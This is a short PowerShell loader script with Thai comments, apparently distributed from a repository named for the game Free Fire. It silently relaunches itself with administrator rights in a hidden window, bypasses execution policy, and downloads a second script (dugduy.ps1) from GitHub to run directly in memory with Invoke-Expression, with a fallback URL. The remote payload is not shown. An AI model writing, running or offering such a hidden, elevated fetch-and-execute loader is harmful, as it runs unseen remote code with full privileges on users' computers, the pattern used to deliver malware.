# ==========================================
# main.ps1 - ตัว Loader หลักสำหรับเรียกใช้งาน
# ==========================================

# 1. ตรวจสอบและขอสิทธิ์ Administrator แบบซ่อนหน้าต่าง (Hidden)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((irm 'https://raw.githubusercontent.com/potae112/Cmdfreefire/refs/heads/main/main.ps1' -UseBasicParsing))`"" -Verb RunAs
    exit
}

# 2. ดึงเนื้อหาจาก dugduy.ps1 (Raw Link) และสั่งรันใน Memory ทันที
$dugduyUrl = "https://raw.githubusercontent.com/potae112/Cmdfreefire/refs/heads/main/dugduy.ps1"

try {
    $scriptContent = Invoke-RestMethod -Uri $dugduyUrl -UseBasicParsing
    Invoke-Expression $scriptContent
} catch {
    # ลิงก์สำรองกรณีโครงสร้าง GitHub เปลียนแปลง
    $backupUrl = "https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1"
    $scriptContent = Invoke-RestMethod -Uri $backupUrl -UseBasicParsing
    Invoke-Expression $scriptContent
}